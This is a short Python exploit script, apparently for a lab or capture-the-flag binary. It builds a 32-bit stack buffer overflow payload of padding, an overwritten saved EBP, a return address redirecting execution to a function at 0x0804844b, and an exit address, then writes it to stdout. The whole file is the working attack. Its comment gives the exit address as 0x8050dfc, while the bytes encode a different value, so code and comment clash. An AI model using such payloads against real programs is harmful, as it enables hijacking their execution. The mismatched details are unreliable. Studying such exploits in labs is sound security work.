#!/usr/bin/env python3
import sys

# Buffer size is 20 bytes
buffer = b"A" * 20

# 4 bytes to overwrite saved EBP
ebp = b"BBBB"

# Address of the function at 0x0804844b in little-endian format
target_addr = b"\x4b\x84\x04\x08"

# Exit address - 0x8050dfc in little-endian format
exit_addr = b"\x70\x1c\x05\x08"

# Combine all parts of the payload
payload = buffer + ebp + target_addr + exit_addr

# Write the payload to stdout
sys.stdout.buffer.write(payload)